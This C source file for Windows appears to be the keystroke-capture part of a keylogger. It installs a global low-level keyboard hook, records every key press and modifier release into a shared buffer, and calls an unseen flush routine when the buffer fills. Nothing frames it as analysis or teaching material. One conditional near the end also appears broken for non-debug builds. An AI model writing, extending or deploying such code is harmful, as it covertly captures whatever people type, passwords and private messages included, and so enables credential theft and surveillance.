#include "kbdHandler.h"

DWORD WINAPI kbdDump()
{
    Index = 0;
    Hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) _hookHandler, NULL, 0);
    if (Hook == NULL)
    {
#ifdef DEBUG
        handleError("SetWindowsHookEx");
#endif
        return -1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {};

    UnhookWindowsHookEx(Hook);

    return 0;
}

LRESULT CALLBACK _hookHandler(int nCode, WPARAM wParam, LPARAM lParam)
{
    DWORD waitRes = WaitForSingleObject(Mutex, INFINITE);
    switch (waitRes)
    {
    case WAIT_OBJECT_0:
        __try
        {
            if (Index == BUFFSIZE)
            {
                GetSystemTimeAsFileTime(&LastFlush);
                flush();
            }

            if (nCode >= 0)
            {
                DWORD code = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
                if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
                {
                    switch (code)
                    {
                    // Shift
                    case VK_SHIFT:
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                    
                    // Ctrl
                    case VK_CONTROL:
                    case VK_LCONTROL:
                    case VK_RCONTROL:
                    
                    // Menu/Alt
                    case VK_MENU:
                    case VK_LMENU:
                    case VK_RMENU:
                    
                    // Win Key
                    case VK_LWIN:
                    case VK_RWIN:
                        code |= 0x100;
                    default:
#pragma warning (disable: 6386)
                        Buffer[Index++] = code;
#pragma warning (default: 6386)
                    }
                }
                if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
                {
                    switch (code)
                    {
                    // Shift
                    case VK_SHIFT:
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                    
                    // Ctrl
                    case VK_CONTROL:
                    case VK_LCONTROL:
                    case VK_RCONTROL:
                    
                    // Menu/Alt
                    case VK_MENU:
                    case VK_LMENU:
                    case VK_RMENU:
                    
                    // Win Key
                    case VK_LWIN:
                    case VK_RWIN:
#pragma warning (disable: 6386)
                        Buffer[Index++] = code;
#pragma warning (default: 6386)
                    default:
                        break;
                    }
                }
            }
        }
        __finally
        {
            if (!ReleaseMutex(Mutex))
#ifdef DEBUG
                handleError("ReleaseMutex");
#endif
        }
        break;
    }

    return CallNextHookEx(Hook, nCode, wParam, lParam);
}